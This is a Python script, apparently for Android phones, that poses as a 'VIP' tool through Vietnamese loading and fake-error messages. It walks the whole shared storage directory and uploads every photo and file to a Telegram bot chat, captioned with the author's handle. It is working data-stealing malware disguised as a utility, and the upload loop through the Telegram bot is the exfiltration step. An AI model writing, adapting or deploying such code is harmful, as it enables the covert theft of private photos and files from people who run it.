import os
import time
import telegram
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

BOT_TOKEN = ' '
CHAT_ID = ' '
IMAGE_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.py']
MAX_RETRIES = 3
SEND_DELAY = 1

def send_file_to_telegram(file_path, bot, chat_id):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            with open(file_path, 'rb') as f:
                bot.send_document(chat_id=chat_id, document=f, caption="coder:@HgAnh7")
            return True
        except telegram.error.TimedOut:
            retries += 1
            time.sleep(5)
        except telegram.error.RetryAfter as e:
            wait_time = int(e.retry_after)
            time.sleep(wait_time)
        except Exception:
            retries += 1
            time.sleep(5)
    return False

def scan_and_upload(bot, chat_id, root_path, is_images_only=False):
    file_queue = Queue()
    for root, dirs, files in os.walk(root_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if is_images_only and not any(file_name.lower().endswith(ext) for ext in IMAGE_EXTENSIONS):
                continue
            if not is_images_only and any(file_name.lower().endswith(ext) for ext in IMAGE_EXTENSIONS):
                continue
            file_queue.put(file_path)

    while not file_queue.empty():
        file_path = file_queue.get()
        send_file_to_telegram(file_path, bot, chat_id)
        time.sleep(SEND_DELAY)

def main():
    print("Đang vào tool...,có thể lâu do chức năng quá vip pro nên chờ 1 tí là vào tool là bú ngay nhé")
    bot = telegram.Bot(token=BOT_TOKEN)
    ROOT_PATH = '/storage/emulated/0'

    with ThreadPoolExecutor(max_workers=2) as executor:
        executor.submit(scan_and_upload, bot, CHAT_ID, ROOT_PATH, is_images_only=False)
        executor.submit(scan_and_upload, bot, CHAT_ID, ROOT_PATH, is_images_only=True)

    executor.shutdown(wait=True)
    print("Tool lỗi")

if __name__ == '__main__':
    main()
